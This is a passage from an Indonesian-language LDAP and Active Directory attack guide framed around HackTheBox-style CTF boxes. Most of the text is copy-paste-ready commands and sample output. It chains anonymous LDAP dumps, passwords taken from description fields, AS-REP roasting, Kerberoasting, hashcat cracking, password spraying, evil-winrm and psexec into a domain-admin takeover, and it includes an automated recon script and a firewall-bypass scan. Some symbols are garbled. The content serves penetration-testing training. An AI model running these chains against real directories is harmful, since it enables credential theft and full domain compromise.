# Akun dengan Unconstrained Delegation (TRUSTED_FOR_DELEGATION)
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName userAccountControl
```

---

## 🔗 BAGIAN 6: LDAP + ATTACK CHAINING

text

```
+----------------------------------------------------------------------------------------------------+
|                                    LDAP ATTACK CHAIN SCENARIOS                                     |
+----------------------------------------------------------------------------------------------------+
| Chain 1: Anonymous Bind -> Password in Description -> Initial Foothold via WinRM                   |
| Chain 2: User Enumeration -> Password Spraying -> BloodHound Collection -> Lateral Movement        |
| Chain 3: SPN Extraction -> Kerberoasting (GetUserSPNs.py) -> Hashcat Crack -> Service Account Shell|
| Chain 4: No Pre-Auth Filter -> AS-REP Roasting (GetNPUsers.py) -> Hashcat Crack -> User Shell      |
| Chain 5: Computer OS Filter -> Outdated Server Discovery -> Unquoted Service Path / Kernel PrivEsc  |
+----------------------------------------------------------------------------------------------------+
```

---

### ⛓️ CHAIN 1: Anonymous LDAP →→ Password in Description →→ WinRM Shell

text

```
[ LDAP Anonymous Bind (Port 389) ] 
               |
      (Query: description=*)
               |
               v
[ Found: jwilson:Summer2023!_Sales ] 
               |
    (Validate Port 5985 WinRM)
               |
               v
[ evil-winrm Shell Access: jwilson ]
```

Bash

```
# 1. Ekstrak password dari description via anonymous bind
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=user)(description=*))" sAMAccountName description

# 2. Uji kredensial ke layanan WinRM (Port 5985)
nxc winrm $TARGET -u 'jwilson' -p 'Summer2023!_Sales'

# 3. Spawn interactive PowerShell shell
evil-winrm -i $TARGET -u 'jwilson' -p 'Summer2023!_Sales'
```

---

### ⛓️ CHAIN 2: LDAP User Enum →→ AS-REP Roasting →→ User Foothold

text

```
[ LDAP User Enum: Filter Pre-Auth ] 
               |
    (Found user: hhogan)
               |
               v
[ Impacket GetNPUsers.py Request TGT ] 
               |
   (Dump $krb5asrep$23$ Hash)
               |
               v
[ Hashcat Offline Crack (Mode 18200) ] 
               |
               v
[ Plaintext Pass Found: Hulkamania1! ] 
               |
               v
[ Authenticated SMB / WinRM Foothold ]
```

Bash

```
# 1. Cari kandidat AS-REP Roasting via LDAP
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# 2. Tarik hash AS-REP tanpa password menggunakan Impacket
impacket-GetNPUsers "$DOMAIN/" -usersfile asrep_users.txt -format hashcat -output asrep_hashes.txt -dc-ip $TARGET -no-pass

# 3. Crack hash secara offline di Parrot OS
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -O

# 4. Login menggunakan kredensial hasil cracking
evil-winrm -i $TARGET -u 'hhogan' -p 'Hulkamania1!'
```

---

### ⛓️ CHAIN 3: LDAP SPN Enum →→ Kerberoasting →→ Service Account Takeover

Bash

```
# 1. Identifikasi SPN via LDAP query terotentikasi
ldapsearch -x -H ldap://$TARGET -D "hhogan@$DOMAIN" -w "Hulkamania1!" -b "$BASE_DN" \
  "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))" sAMAccountName

# 2. Minta tiket TGS dan dump format Hashcat via Impacket
impacket-GetUserSPNs "$DOMAIN/hhogan:Hulkamania1!" -dc-ip $TARGET -request -output kerberoast_hashes.txt

# 3. Crack Kerberos TGS Ticket Hash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -O
```

---

## 🌐 BAGIAN 7: LDAP DI BERBAGAI ENVIRONMENT

### 1. Microsoft Windows Active Directory (Paling Umum di CTF)

- Menggunakan schema `objectCategory`, `sAMAccountName`, `userAccountControl`, `objectSid`.
- Default search base selalu berformat `DC=domain,DC=local`.
- Mendukung fitur khusus seperti Global Catalog (Port 3268) dan integrasi Kerberos KDC (Port 88).

### 2. OpenLDAP (Linux)

- Sering ditemukan pada box Linux mandiri yang mengimplementasikan SSO (_Single Sign-On_).
- Menggunakan schema standar RFC seperti `posixAccount`, `uid`, `shadowAccount`, `userPassword`.
- Root admin default biasanya berupa `cn=admin,dc=example,dc=org` atau `cn=Manager,dc=example,dc=org`.

Bash

```
# Enumerasi User & Password Hash pada OpenLDAP (Jika Anonymous Bind Aktif):
ldapsearch -x -H ldap://$TARGET -b "dc=example,dc=org" "(objectClass=posixAccount)" uid userPassword
```

text

```
CONTOH OUTPUT OPENLDAP (USER PASSWORD HASH):
dn: uid=devuser,ou=People,dc=example,dc=org
uid: devuser
userPassword:: e1NTSEF9M2JkM0l0K0... (Base64 SSHA Hash -> Siap di-crack!)
```

---

## 🌳 BAGIAN 8: DECISION TREE LENGKAP

text

```
                       [PORT 389 / 636 TERBUKA]
                                   |
            +----------------------+----------------------+
            | Query RootDSE (ldapsearch -s base)          |
            | -> Extract Base DN & FQDN Domain Name        |
            +----------------------+----------------------+
                                   |
                      [TEST ANONYMOUS BIND]
                      ldapsearch -x -b "$BASE_DN"
                                   |
         +-------------------------+-------------------------+
         |                                                   |
 [ANONYMOUS BERHASIL]                                [ANONYMOUS DITOLAK]
         |                                                   |
 +-------+-------+                                   +-------+-------+
 |               |                                   |               |
[DUMP USERS]    [CHECK DESCRIPTION]          [OBTAIN CREDENTIALS]  [ANON SMB / SNMP?]
 |               |                            From Other Services:   (File 05 / File 10)
Users.txt   Password in Description?          - SMB / FTP / Web / SQL        |
 |               |                                   |                       |
 |        +------+------+                            +-----------+-----------+
 |        |             |                                        |
 |      [YES]          [NO]                              [CREDENTIALS FOUND]
 |        |             |                                        |
 |   Direct WinRM    Search AS-REP Candidates                    v
 |   Foothold!       (UAC: 4194304)                     [AUTHENTICATED BIND]
 |                      |                               ldapsearch -D user -w pass
 |               +------+------+                                 |
 |               |             |                         +-------+-------+
 |             [YES]          [NO]                       |               |
 |               |             |                 [BLOODHOUND DUMP]  [KERBEROASTING]
 |         AS-REP Roasting  Password Spray       bloodhound-python  GetUserSPNs.py
 |         GetNPUsers.py    nxc ldap --spray             |               |
 |               |             |                  Graph Analysis   Hashcat 13100
 |               +------+------+                         |               |
 |                      |                                v               v
 +----------------------+----------------------> [DOMAIN PRIVILEGE ESCALATION]
```

---

## 🔧 BAGIAN 9: COMMON ERRORS & TROUBLESHOOTING

### 1. `ldap_result: Can't contact LDAP server (-1)`

- **Penyebab:** Port 389 diblokir firewall, salah menentukan IP, atau service LDAP memerlukan SSL (LDAPS).
- **Solusi CLI:** Uji coba menggunakan protokol `ldaps://` pada port 636:
    
    Bash
    
    ```
    ldapsearch -x -H ldaps://$TARGET:636 -s base namingcontexts
    ```
    

### 2. `ldap_search_ext: Operations error (1) / Insufficient access rights (50)`

- **Penyebab:** Server menolak Anonymous Bind.
- **Solusi CLI:** Anda wajib menyertakan akun autentikasi valid via flag `-D` dan `-w`:
    
    Bash
    
    ```
    ldapsearch -x -H ldap://$TARGET -D "user@domain.local" -w "pass" -b "$BASE_DN"
    ```
    

### 3. `ldap_search_ext: Size limit exceeded (4)`

- **Penyebab:** Server Active Directory membatasi maksimal 1000 hasil query per request. Output terpotong!
- **Solusi CLI:** Aktifkan Simple Paging extension `-E pr=1000/noprompt`:
    
    Bash
    
    ```
    ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" -E pr=1000/noprompt "(objectClass=user)" sAMAccountName
    ```
    

### 4. Output Menampilkan Format Base64 (`userPassword:: e1NTSE...` atau `description:: VGVtc...`)

- **Penyebab:** `ldapsearch` otomatis mengubah nilai menjadi Base64 jika string mengandung karakter non-ASCII, spasi ganda, atau titik dua (`:`).
- **Solusi CLI:** Decode manual via bash:
    
    Bash
    
    ```
    echo "VGVtcFBhc3MxMjMh" | base64 -d
    ```
    

### 5. `Invalid DN syntax (34)`

- **Penyebab:** Salah format penulisan Base DN (misal: lupa tanda kutip atau salah koma).
- **Solusi CLI:** Pastikan penulisan DN dibungkus tanda kutip ganda yang rapi:
    
    Bash
    
    ```
    ldapsearch -x -H ldap://$TARGET -b "DC=inlanefreight,DC=local"
    ```
    

### 6. `No such object (32)`

- **Penyebab:** Base DN yang dimasukkan tidak eksis di direktori target.
- **Solusi CLI:** Query ulang namingContexts dari RootDSE untuk memastikan Base DN yang presisi:
    
    Bash
    
    ```
    ldapsearch -x -H ldap://$TARGET -s base namingcontexts
    ```
    

### 7. LDAPS (Port 636) TLS/Certificate Verification Error

- **Penyebab:** Parrot OS menolak koneksi SSL karena sertifikat Domain Controller bersifat Self-Signed.
- **Solusi CLI:** Matikan validasi TLS sertifikat sementara melalui environment variable:
    
    Bash
    
    ```
    LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://$TARGET:636 -s base namingcontexts
    ```
    

### 8. `Bad search filter (-7)`

- **Penyebab:** Kurung kurawal `()` tidak seimbang atau salah posisi operator AND `&`/OR `|`.
- **Solusi CLI:** Pastikan setiap kondisi berada di dalam kurung dan operator berada di depan:
    
    Bash
    
    ```
    # BENAR:
    "(&(objectClass=user)(adminCount=1))"
    # SALAH:
    "(objectClass=user & adminCount=1)"
    ```
    

### 9. Kerberos Pre-Authentication Failed saat Authenticated Query

- **Penyebab:** Jam sistem mesin Parrot OS tidak sinkron dengan jam Domain Controller (>5>5 menit drift).
- **Solusi CLI:** Sinkronkan jam lokal dengan DC target via `rdate` atau `ntpdate`:
    
    Bash
    
    ```
    sudo rdate -n $TARGET
    ```
    

### 10. NetExec LDAP "STATUS_PASSWORD_MUST_CHANGE"

- **Penyebab:** Kredensial valid, tetapi user diwajibkan mengganti password saat login pertama.
- **Solusi CLI:** Gunakan `smbpasswd` untuk mengubah password langsung dari terminal:
    
    Bash
    
    ```
    smbpasswd -r $TARGET -U username
    ```
    

---

## 🏆 BAGIAN 10: REAL CTF EXAMPLES

---

### 📝 EXAMPLE 1: Anonymous LDAP →→ Password in Description →→ WinRM Shell

**Target:** HackTheBox — Cascade / Sauna Style Box

#### Step 1: RootDSE & Base DN Discovery

Bash

```
ldapsearch -x -H ldap://10.10.10.182 -s base namingcontexts
```

text

```
dn:
namingContexts: DC=cascade,DC=local
```

#### Step 2: Anonymous Bind Dump Description Attributes

```bash
ldapsearch -x -H ldap://10.10.10.182 -b "DC=cascade,DC=local" "(&(objectClass=user)(description=*))" sAMAccountName description
```

```text
dn: CN=Ryan Thompson,OU=IT,DC=cascade,DC=local
sAMAccountName: r.thompson
description: Temp password for onboarding: Casc@de2020!

dn: CN=Arkady Renko,OU=Audit,DC=cascade,DC=local
sAMAccountName: a.renko
description: Audit contractor account
```

#### Step 3: Validasi Kredensial & Spawn WinRM Shell

```bash
nxc winrm 10.10.10.182 -u 'r.thompson' -p 'Casc@de2020!'
```

```text
WINRM       10.10.10.182    5985   DC01             [+] cascade.local\r.thompson:Casc@de2020! (Pwn3d!)
```

```bash
evil-winrm -i 10.10.10.182 -u 'r.thompson' -p 'Casc@de2020!'
```

```text
*Evil-WinRM* PS C:\Users\r.thompson\Documents> whoami
cascade\r.thompson
*Evil-WinRM* PS C:\Users\r.thompson\Documents> type C:\Users\r.thompson\Desktop\user.txt
3f8a4b...[REDACTED]...
```

---

### 📝 EXAMPLE 2: LDAP User Enum →→ AS-REP Roasting →→ Domain Admin

**Target:** HackTheBox — Forest Style Machine

#### Step 1: Ekstraksi Seluruh Username via Anonymous / Low-Priv LDAP

Bash

```
ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" "(objectClass=user)" sAMAccountName \
  | grep "^sAMAccountName:" | awk '{print $2}' > users.txt
```

#### Step 2: Cek Akun Tanpa Pre-Authentication (AS-REP Roasting)

Bash

```
impacket-GetNPUsers "htb.local/" -usersfile users.txt -format hashcat -output asrep.hashes -dc-ip 10.10.10.161 -no-pass
```

text

```
[*] Getting TGT for sebastien
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[*] Getting TGT for fsmith
[+] Got TGT for fsmith!
$krb5asrep$23$fsmith@HTB.LOCAL:d4f8a...[HASH REDACTED]...
```

#### Step 3: Crack Hash & Password Spraying

Bash

```
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt -O
```

text

```
$krb5asrep$23$fsmith@HTB.LOCAL:...:TheCorrs2019
```

Bash

```
# Login WinRM dengan akun fsmith
evil-winrm -i 10.10.10.161 -u 'fsmith' -p 'TheCorrs2019'
```

---

### 📝 EXAMPLE 3: SPN Enumeration →→ Kerberoasting →→ Privilege Escalation

**Target:** HackTheBox — Active Style Machine

#### Step 1: Query Akun SPN via LDAP

Bash

```
ldapsearch -x -H ldap://10.10.10.100 -D "vparker@active.local" -w "Welcome1" -b "DC=active,DC=local" \
  "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))" sAMAccountName servicePrincipalName
```

text

```
dn: CN=SQL Service,CN=Users,DC=active,DC=local
sAMAccountName: svc_admin
servicePrincipalName: active/active.local:1433
```

#### Step 2: Request TGS Hash & Offline Cracking

Bash

```
impacket-GetUserSPNs "active.local/vparker:Welcome1" -dc-ip 10.10.10.100 -request -output kerberoast.hashes
```

text

```
ServicePrincipalName     Name       MemberOf                               PasswordLastSet
-----------------------  ---------  -------------------------------------  -------------------
active/active.local:1433 svc_admin  CN=Domain Admins,CN=Users,DC=active... 2018-07-18 15:45:00
[+] Hash dumped to kerberoast.hashes
```

Bash

```
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt -O
```

text

```
$krb5tgs$23$*svc_admin*ACTIVE.LOCAL*active/active.local:1433*...:Gky6 paradox
```

#### Step 3: Pwn Domain Admin!

Bash

```
impacket-psexec "active.local/svc_admin:Gky6 paradox"@10.10.10.100
```

text

```
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Opening SVCManager on 10.10.10.100.....
[*] Starting service.....
[+] Process created with PID 2844.
Microsoft Windows [Version 6.0.6001]
C:\Windows\system32> whoami
nt authority\system
```

---

## ⚡ BAGIAN 11: CHEATSHEET LDAP (COPY-PASTE READY)

Gunakan variabel environment berikut di terminal Parrot OS Anda:

Bash

```
export TARGET="10.10.11.200"
export DOMAIN="inlanefreight.local"
export BASE_DN="DC=inlanefreight,DC=local"
export USER="username"
export PASS="password"
```

Bash

```
# ==========================================
# 1. ROOTDSE & RECONNAISSANCE
# ==========================================
ldapsearch -x -H ldap://$TARGET -s base namingcontexts                  # Get Base DN
ldapsearch -x -H ldap://$TARGET -s base -b "" "(objectClass=*)"         # Full RootDSE Dump
nmap -p 389 --script ldap-rootdse $TARGET                                # Nmap RootDSE check

# ==========================================
# 2. ANONYMOUS BIND EXTRACTION
# ==========================================
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(objectClass=user)" sAMAccountName # Dump all users
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=user)(description=*))" sAMAccountName description # Password in Desc
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(objectClass=computer)" dNSHostName operatingSystem # Dump computers
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(objectClass=group)" cn member # Dump groups & members

# ==========================================
# 3. KERBEROS ATTACK FILTERS
# ==========================================
# SPN Accounts (Kerberoasting Targets):
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))" sAMAccountName
# AS-REP Roasting Candidates (DONT_REQ_PREAUTH):
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
# AdminSDHolder High-Value Targets:
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=user)(adminCount=1))" sAMAccountName

# ==========================================
# 4. AUTHENTICATED AUTOMATION
# ==========================================
nxc ldap $TARGET -u "$USER" -p "$PASS"                                  # Test creds via LDAP
nxc ldap $TARGET -u "$USER" -p "$PASS" --pass-pol                       # Check password lockout policy
ldapdomaindump ldap://$TARGET -u "$DOMAIN\\$USER" -p "$PASS" -o ./loot/  # Visual HTML/JSON domain dump
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -dc "$TARGET" -c All --zip # BloodHound Collection

# ==========================================
# 5. PASSWORD SPRAYING
# ==========================================
nxc ldap $TARGET -u users.txt -p 'Welcome2023!' --continue-on-success   # Safe LDAP Spray
```

---

## ⚡ BAGIAN 12: AUTOMATION SCRIPT — `ldap_auto_recon.sh`

Script otomasi siap pakai di Parrot OS XFCE untuk menjalankan seluruh tahapan enumerasi LDAP Active Directory secara berurutan:

```bash
#!/bin/bash
# ==============================================================================
# Script Name : ldap_auto_recon.sh
# Description : Otomasi Reconnaissance LDAP & Active Directory Hunting
# Usage       : ./ldap_auto_recon.sh <TARGET_IP>
# Example     : ./ldap_auto_recon.sh 10.10.11.200
# ==============================================================================

TARGET=$1
OUTPUT_DIR="./ldap_results_${TARGET}"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    echo "Contoh: $0 10.10.11.200"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo -e "\033[1;34m========================================================\033[0m"
echo -e "\033[1;34m  LDAP Auto Recon — Target: $TARGET\033[0m"
echo -e "\033[1;34m========================================================\033[0m"

# Step 1: RootDSE Discovery & Extract Base DN
echo -e "\n\033[1;33m[*] Step 1: RootDSE Discovery & Base DN Extraction...\033[0m"
BASE_DN=$(ldapsearch -x -H ldap://$TARGET \
  -s base namingcontexts 2>/dev/null \
  | grep "^namingContexts:" \
  | grep -v "CN=" \
  | head -1 \
  | awk '{print $2}')

if [ -z "$BASE_DN" ]; then
    echo -e "\033[1;31m[-] Gagal terhubung ke service LDAP di $TARGET port 389.\033[0m"
    exit 1
fi

echo -e "\033[1;32m[+] Base DN Ditemukan: $BASE_DN\033[0m"

DOMAIN=$(echo $BASE_DN \
  | sed 's/DC=//g' \
  | sed 's/,/./g' \
  | tr '[:upper:]' '[:lower:]')
echo -e "\033[1;32m[+] Domain FQDN: $DOMAIN\033[0m"

# Step 2: Testing Anonymous Bind
echo -e "\n\033[1;33m[*] Step 2: Testing Anonymous Bind (Null Session)...\033[0m"
ANON_TEST=$(ldapsearch -x -H ldap://$TARGET \
  -b "$BASE_DN" "(objectClass=*)" -s sub \
  -z 1 dn 2>&1)

if echo "$ANON_TEST" | grep -q "numEntries"; then
    echo -e "\033[1;32m[+] ANONYMOUS BIND BERHASIL (JACKPOT)! Melanjutkan dump data...\033[0m"
    BIND_OPTS="-x"
    BIND_TYPE="anonymous"
else
    echo -e "\033[1;31m[-] Anonymous bind ditolak oleh server.\033[0m"
    BIND_TYPE="authenticated"
    if [ -z "$AUTH_USER" ] || [ -z "$AUTH_PASS" ]; then
        echo -e "\033[1;33m[*] Set environment variable AUTH_USER dan AUTH_PASS untuk melanjutkan:\033[0m"
        echo "    export AUTH_USER='username'"
        echo "    export AUTH_PASS='password'"
        echo "[-] Berhenti karena belum ada kredensial."
        exit 1
    fi
    echo -e "\033[1;32m[+] Menggunakan kredensial: ${AUTH_USER}@${DOMAIN}\033[0m"
    BIND_OPTS="-x -D ${AUTH_USER}@${DOMAIN} -w ${AUTH_PASS}"
fi

# Step 3: User Enumeration
echo -e "\n\033[1;33m[*] Step 3: Mengekstrak seluruh akun pengguna...\033[0m"
ldapsearch $BIND_OPTS -H ldap://$TARGET \
  -b "$BASE_DN" \
  "(&(objectClass=user)(objectCategory=person))" \
  sAMAccountName description \
  -E pr=1000/noprompt 2>/dev/null \
  > "$OUTPUT_DIR/users_full.txt"

# Extract clean username list
grep "^sAMAccountName:" "$OUTPUT_DIR/users_full.txt" \
  | awk '{print $2}' | sort -u \
  > "$OUTPUT_DIR/users.txt"
echo -e "\033[1;32m[+] Total $(wc -l < $OUTPUT_DIR/users.txt) user tersimpan di $OUTPUT_DIR/users.txt\033[0m"

# Step 4: Check Password in Description (PRIORITAS NOMOR 1!)
echo -e "\n\033[1;33m[*] Step 4: Berburu password di kolom Description...\033[0m"
grep -A1 "^sAMAccountName:\|^description:" \
  "$OUTPUT_DIR/users_full.txt" \
  | grep -B1 -iE "pass|pwd|temp|welcome|login|cred" \
  | tee "$OUTPUT_DIR/POTENTIAL_PASSWORDS.txt"

if [ -s "$OUTPUT_DIR/POTENTIAL_PASSWORDS.txt" ]; then
    echo -e "\n\033[1;31m========================================================\033[0m"
    echo -e "\033[1;31m  ⚠️  POTENTIAL PASSWORD DITEMUKAN DI DESKRIPSI!         \033[0m"
    echo -e "\033[1;31m========================================================\033[0m"
    cat "$OUTPUT_DIR/POTENTIAL_PASSWORDS.txt"
fi

# Step 5: SPN Enumeration (Kerberoasting Targets)
echo -e "\n\033[1;33m[*] Step 5: Mengekstrak akun dengan ServicePrincipalName (SPN)...\033[0m"
ldapsearch $BIND_OPTS -H ldap://$TARGET \
  -b "$BASE_DN" \
  "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))" \
  sAMAccountName servicePrincipalName 2>/dev/null \
  | grep -E "sAMAccountName:|servicePrincipalName:" \
  | tee "$OUTPUT_DIR/spn_accounts.txt"

# Step 6: AS-REP Roasting Candidates (DONT_REQ_PREAUTH)
echo -e "\n\033[1;33m[*] Step 6: Mengekstrak kandidat AS-REP Roasting...\033[0m"
ldapsearch $BIND_OPTS -H ldap://$TARGET \
  -b "$BASE_DN" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName 2>/dev/null \
  | grep "^sAMAccountName:" \
  | awk '{print $2}' \
  | tee "$OUTPUT_DIR/asrep_candidates.txt"

echo -e "\n\033[1;34m[+] Enumerasi selesai! Seluruh bukti tersimpan di: $OUTPUT_DIR/\033[0m"
echo -e "\033[1;36m[*] Rekomendasi langkah berikutnya:\033[0m"
if [ -s "$OUTPUT_DIR/asrep_candidates.txt" ]; then
    echo "    → AS-REP Roasting:"
    echo "      impacket-GetNPUsers $DOMAIN/ -usersfile $OUTPUT_DIR/asrep_candidates.txt -format hashcat -no-pass -dc-ip $TARGET"
fi
if [ -s "$OUTPUT_DIR/spn_accounts.txt" ]; then
    echo "    → Kerberoasting (memerlukan 1 kredensial valid):"
    echo "      impacket-GetUserSPNs $DOMAIN/user:pass -dc-ip $TARGET -request"
fi
```

```bash
# Cara Menggunakan Script di Parrot OS:
chmod +x ldap_auto_recon.sh
./ldap_auto_recon.sh 10.10.11.200
```

---

# LDAP Complete Attack Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah kecuali diarahkan.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"         # IP tun0 kamu (VPN HTB/THM)
export LPORT="4444"
mkdir -p ~/ldap_loot/{users,creds,dump,hashes,bloodhound}
cd ~/ldap_loot

echo "[*] Target: $TARGET | LHOST: $LHOST"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | LHOST: 10.10.14.5
```

---

## ═══════════════════════════════════════

## FASE 0: KONFIRMASI PORT AKTIF

## ═══════════════════════════════════════

### Langkah 0.1 — Deteksi Port LDAP (Semua Varian)

Bash

```
# Command 1: Scan semua port LDAP standar sekaligus
nmap -sV -p 389,636,3268,3269 $TARGET -oN ~/ldap_loot/nmap_ldap.txt

# Command 2: Jika nmap lambat, quick check dengan nc
nc -zv $TARGET 389 2>&1
nc -zv $TARGET 636 2>&1
nc -zv $TARGET 3268 2>&1
```

**OUTPUT BERHASIL ✅ — Port LDAP terbuka:**

text

```
389/tcp  open  ldap     Microsoft Windows Active Directory LDAP (Domain: CORP.LOCAL, Site: Default-First-Site-Name)
636/tcp  open  ldapssl?
3268/tcp open  ldap     Microsoft Windows Active Directory LDAP (Domain: CORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp filtered globalcatLDAPS
```

**Cara baca output ini — PENTING:**

|Port|Status|Arti & Tindakan|
|---|---|---|
|`389 open`|LDAP Plaintext|**Port utama** — mulai semua query dari sini|
|`636 open`|LDAPS (TLS)|Jika 389 diblokir, gunakan ini dengan `ldaps://`|
|`3268 open`|Global Catalog|Ada **multi-domain forest** — bisa query semua domain|
|`3269 open`|GC SSL|Global Catalog versi encrypted|
|`filtered`|Firewall|Skip port ini, gunakan alternatif|

**OUTPUT GAGAL ❌ — Semua port filtered:**

text

```
389/tcp  filtered ldap
636/tcp  filtered ldapssl
```

➡️ LDAP diblokir firewall. Coba:

Bash

```
# Bypass dengan source port 53 (DNS)
nmap -sS -p 389 --source-port 53 $TARGET

# Cek apakah ada web interface LDAP (port 80/443 dengan /ldap atau /ad)
curl -sk https://$TARGET/ldap 2>/dev/null | head -20

# Jika ini environment AD, SMB port 445 biasanya tetap buka
# → Pivot ke <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a> untuk enum via SMB/RPC
```

---

### Langkah 0.2 — RootDSE Discovery (Selalu Accessible, Tanpa Auth)

> **Kenapa ini penting?** RootDSE adalah "halaman depan" LDAP server yang bisa dibaca SIAPAPUN tanpa login. Di sini kita dapat Base DN, hostname DC, dan versi Windows.

Bash

```
# Command 1: Ambil namingContexts (Base DN) — PALING PENTING
ldapsearch -x -H ldap://$TARGET -s base namingcontexts

# Command 2: RootDSE lengkap dengan info OS dan versi
ldapsearch -x -H ldap://$TARGET -s base -b "" "(objectClass=*)" \
    defaultNamingContext \
    dnsHostName \
    domainFunctionality \
    forestFunctionality \
    supportedLDAPVersion \
    serverName

# Command 3: Via Nmap NSE (alternatif cepat)
nmap -p 389 --script ldap-rootdse $TARGET
```

**OUTPUT BERHASIL ✅ — RootDSE berhasil dibaca:**

text

```
dn:
namingContexts: DC=inlanefreight,DC=local
namingContexts: CN=Configuration,DC=inlanefreight,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=inlanefreight,DC=local
namingContexts: DC=DomainDnsZones,DC=inlanefreight,DC=local
namingContexts: DC=ForestDnsZones,DC=inlanefreight,DC=local
defaultNamingContext: DC=inlanefreight,DC=local
dnsHostName: DC01.inlanefreight.local
domainFunctionality: 7
forestFunctionality: 7
serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,...
```

**Cara baca dan tindakan LANGSUNG:**

|Field|Nilai Contoh|Tindakan|
|---|---|---|
|`namingContexts: DC=...`|`DC=inlanefreight,DC=local`|**Ini BASE_DN kamu** — catat!|
|`dnsHostName`|`DC01.inlanefreight.local`|Tambah ke `/etc/hosts`|
|`domainFunctionality: 7`|Windows Server 2016/2019/2022|Info OS untuk exploit lookup|
|`domainFunctionality: 6`|Windows Server 2012 R2|Mungkin ada CVE legacy|
|`domainFunctionality: 5`|Windows Server 2008 R2|Target empuk untuk exploits|

➡️ **Set variabel environment sekarang:**

Bash

```
# SIMPAN BASE_DN — akan dipakai di SEMUA command berikutnya
export BASE_DN="DC=inlanefreight,DC=local"
export DOMAIN="inlanefreight.local"
export DC_HOST="DC01.inlanefreight.local"

# Tambahkan ke /etc/hosts agar resolusi nama bekerja
echo "$TARGET $DOMAIN $DC_HOST DC01" | sudo tee -a /etc/hosts

# Verifikasi
ping -c 1 $DOMAIN
```

**OUTPUT BERHASIL ✅ — Otomatis ekstrak BASE_DN (one-liner):**

Bash

```
# Auto-detect dan set BASE_DN langsung
export BASE_DN=$(ldapsearch -x -H ldap://$TARGET \
    -s base namingcontexts 2>/dev/null \
    | grep "^namingContexts:" \
    | grep -v "CN=" \
    | head -1 \
    | awk '{print $2}')

export DOMAIN=$(echo $BASE_DN | sed 's/DC=//g' | sed 's/,/./g' | tr '[:upper:]' '[:lower:]')

echo "[+] Base DN: $BASE_DN"
echo "[+] Domain: $DOMAIN"
```

**OUTPUT:**

text

```
[+] Base DN: DC=inlanefreight,DC=local
[+] Domain: inlanefreight.local
```

**OUTPUT GAGAL ❌ — ldap_result: Can't contact LDAP server (-1):**

text

```
ldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)
```

➡️ Port 389 tidak bisa diakses. Coba:

Bash

```
# Coba LDAPS (port 636) — matikan validasi TLS dulu
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://$TARGET:636 -s base namingcontexts

# Coba Global Catalog port 3268
ldapsearch -x -H ldap://$TARGET:3268 -s base namingcontexts

# Jika semua gagal → LDAP tidak accessible dari posisi kamu
# → Beralih ke enum via SMB (<a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>)
# → Atau pivot dari host lain jika sudah punya foothold
```

**Lanjut ke FASE 1.**

---

## ═══════════════════════════════════════

## FASE 1: ANONYMOUS BIND TEST (NULL SESSION)

## ═══════════════════════════════════════

> **Tujuan:** Cek apakah LDAP server izinkan query TANPA credentials. Di CTF dan misconfigured environments, ini sangat sering berhasil dan bisa langsung dump seluruh AD.

### Langkah 1.1 — Test Anonymous Bind (3 Tool Sekaligus)

Bash

```
# Command 1: ldapsearch anonymous test — paling reliable
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(objectClass=*)" -s sub -z 1 dn

# Command 2: NetExec LDAP anonymous check — output lebih bersih
nxc ldap $TARGET -u '' -p ''

# Command 3: Coba juga dengan user "guest"
nxc ldap $TARGET -u 'guest' -p ''
```

**OUTPUT BERHASIL ✅ — Anonymous Bind DIIZINKAN (JACKPOT!):**

Untuk `ldapsearch`:

text

```
# extended LDIF
# LDAPv3
# base <DC=inlanefreight,DC=local> with scope subtree
# filter: (objectClass=*)
# requesting: dn 
dn: DC=inlanefreight,DC=local
# numResponses: 2
# numEntries: 1
```

Untuk `nxc`:
